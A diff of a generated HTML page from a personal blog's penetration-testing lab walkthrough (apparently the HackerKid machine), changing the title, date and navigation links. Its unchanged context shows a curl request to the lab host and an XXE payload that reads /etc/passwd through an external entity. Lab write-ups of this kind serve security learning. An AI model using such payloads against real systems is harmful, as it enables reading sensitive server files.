@@ -9,7 +9,7 @@
     
     <title>
         
-            渗透测试 |
+            渗透靶机 |
         
         Jerem1ah&#39;s Blog
     </title>
@@ -147,7 +147,7 @@
         <div class="article-content-container">
 
             <div class="article-title">
-                <span class="title-hover-animation">渗透测试</span>
+                <span class="title-hover-animation">渗透靶机</span>
             </div>
 
             
@@ -175,7 +175,7 @@
     
         <span class="article-update-date article-meta-item">
         <i class="fas fa-file-pen"></i>&nbsp;
-        <span class="pc">2023-08-17 14:42:21</span>
+        <span class="pc">2023-09-07 21:06:03</span>
     </span>
     
     
@@ -681,7 +681,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;name&gt;1&lt;/name&gt;</span><br><span class="line">  &lt;tel&gt;1&lt;/tel&gt;</span><br><span class="line">  &lt;email&gt;xxx@xxx.com&lt;/email&gt;</span><br><span class="line">  &lt;password&gt;1&lt;/password&gt;</span><br><span class="line">&lt;/root&gt;&#x27; \</span><br><span class="line">| curl http://192.168.56.108/process.php \</span><br><span class="line">-H &#x27;Host: hackerkid.blackhat.local&#x27; \</span><br><span class="line">-d @-</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>返回的内容是 <code>Sorry, xxx@xxx.com is not available !!!</code> 其中 <a class="link"   href="mailto:&#120;&#120;&#x78;&#x40;&#120;&#x78;&#120;&#46;&#x63;&#111;&#x6d;" >&#120;&#120;&#x78;&#x40;&#120;&#x78;&#120;&#46;&#x63;&#111;&#x6d;<i class="fas fa-external-link-alt"></i></a> 经过多次尝试此处是动态回返的</li>
+<li>返回的内容是 <code>Sorry, xxx@xxx.com is not available !!!</code> 其中 <a class="link"   href="mailto:&#x78;&#120;&#x78;&#64;&#120;&#120;&#120;&#46;&#x63;&#x6f;&#x6d;" >&#x78;&#120;&#x78;&#64;&#120;&#120;&#120;&#46;&#x63;&#x6f;&#x6d;<i class="fas fa-external-link-alt"></i></a> 经过多次尝试此处是动态回返的</li>
 <li>对此我们可以尝试使用 xml 的相关漏洞</li>
 </ul>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">drug</span> [<span class="meta">&lt;!ENTITY k <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>1<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tel</span>&gt;</span>1<span class="tag">&lt;/<span class="name">tel</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">email</span>&gt;</span><span class="symbol">&amp;k;</span><span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -837,6 +837,21 @@
 
             
                 <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2023/09/07/31php-python%E7%BB%93%E5%90%88%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">php-python结合的一道题目</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                            </a>
+                        </div>
                     
                     
                         <div class="article-next">
